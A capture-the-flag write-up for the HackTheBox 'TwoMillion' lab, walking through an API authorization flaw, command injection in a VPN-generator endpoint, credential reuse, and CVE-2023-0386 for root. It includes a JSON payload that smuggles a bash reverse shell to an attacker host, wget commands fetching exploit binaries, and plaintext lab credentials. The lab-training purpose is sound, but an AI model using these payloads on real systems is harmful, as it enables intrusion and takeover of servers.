# HackTheBox: TwoMillion Write-up

TwoMillion is an Easy Linux machine. The route starts with the invite-code challenge, then abuses an API authorization flaw to become an administrator and a command injection in the VPN generator to obtain a web-shell. Credentials in the application’s `.env` file provide access as `admin`, and CVE-2023-0386 in OverlayFS/FUSE leads to root.

## Enumeration

I started with an Nmap scan against the target:

```bash
nmap -sSVC -A <TARGET_IP>
```

The scan revealed SSH and an Nginx web server:

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  nginx
```

The website redirects to `2million.htb`. I added the hostname and target IP to `/etc/hosts`:

```text
<TARGET_IP> 2million.htb
```

## Initial Access: Invite Code and Account Registration

The `/invite` page requires an invite code. The API explains how to generate one, but returns its instructions encoded with ROT13:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate \
  | jq -r '.data.data' \
  | tr 'a-zA-Z' 'n-za-mN-Z'
```

The decoded message says to send a `POST` request to `/api/v1/invite/generate`. The response contains a Base64-encoded code:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

Decode the returned value and use the resulting code to register an account on `/register`:

```bash
printf '%s' '<BASE64_INVITE_CODE>' | base64 -d
```

After registering and logging in, I inspected the API routes. The authenticated `/api` endpoint reveals `/api/v1`, which lists user and admin endpoints:

```bash
curl -s http://2million.htb/api \
  --cookie 'PHPSESSID=<PHPSESSID>' | jq
```

Use the PHP session cookie from your own authenticated session in the requests below.

## Privilege Escalation to Administrator: API Settings Update

The API’s admin check initially reports that the logged-in account is not an administrator. However, the `PUT /api/v1/admin/settings/update` endpoint accepts an update to the current user’s `is_admin` field without enforcing the required authorization. A JSON content-type header is needed:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<PHPSESSID>' \
  -H 'Content-Type: application/json' \
  --data '{"email":"<YOUR_EMAIL>","is_admin":1}' | jq
```

I confirmed the role change with the admin-authentication endpoint:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<PHPSESSID>' | jq
```

A successful response includes `"message": true`.

## Shell as `www-data`: VPN Generator Command Injection

As an administrator, I could access `POST /api/v1/admin/vpn/generate`. Its `username` parameter is vulnerable to command injection. I first confirmed execution with an `id` command:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<PHPSESSID>' \
  -H 'Content-Type: application/json' \
  --data '{"username":"hacker;id;"}'
```

The response showed that the command runs as `www-data`. I started a listener, then supplied a reverse-shell command through the same parameter:

```bash
nc -lvnp 4444
```

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<PHPSESSID>' \
  -H 'Content-Type: application/json' \
  --data '{"username":"hacker;bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\" #"}'
```

The callback provides a shell as `www-data`. In the web root, I found database credentials in `.env`:

```bash
cat /var/www/html/.env
```

```text
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## User Ownership: Reused Database Password

The database password is reused by the local `admin` account. I used it to connect over SSH and read the user flag:

```bash
ssh admin@<TARGET_IP>
cat ~/user.txt
```

The flag value is intentionally omitted.

## Root: CVE-2023-0386 OverlayFS/FUSE Privilege Escalation

As `admin`, I checked the local mail and found a hint about an unpatched OverlayFS/FUSE issue:

```bash
cat /var/mail/admin
```

The target is running an old Ubuntu kernel (`5.15.70`), vulnerable to [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386), a local privilege-escalation flaw involving OverlayFS and file ownership/capabilities.

On my attack machine, I built the public [CVE-2023-0386 proof of concept](https://github.com/xkaneiki/CVE-2023-0386) and served its binaries over HTTP:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
cd CVE-2023-0386
make all
python3 -m http.server 8000
```

In the target shell, I downloaded the required binaries and prepared the OverlayFS directories:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/fuse
wget http://<ATTACKER_IP>:8000/exp
wget http://<ATTACKER_IP>:8000/gc
chmod +x fuse exp gc
mkdir -p ovlcap/lower ovlcap/upper ovlcap/work ovlcap/merge
```

The exploit needs two target shells. In the first, start the FUSE process:

```bash
cd /tmp
./fuse ./ovlcap/lower ./gc
```

In the second, run the exploit:

```bash
cd /tmp
./exp
whoami
```

The resulting shell runs as root. I read the root flag from `/root/root.txt`; its value is intentionally omitted.

## Attack Path

```text
Nmap → 2million.htb
  ↓
ROT13 invite instructions → generated invite code → registered account
  ↓
Vulnerable user-settings update → administrator role
  ↓
VPN generation command injection → shell as www-data
  ↓
.env database password reused for SSH as admin
  ↓
CVE-2023-0386 OverlayFS/FUSE exploit → root
```

## References

- [NVD — CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [xkaneiki — CVE-2023-0386 proof of concept](https://github.com/xkaneiki/CVE-2023-0386)

> Replace `<TARGET_IP>` and `<ATTACKER_IP>` with your HTB VPN values, and `<PHPSESSID>` with the cookie from your own logged-in session. Flag values are intentionally omitted.
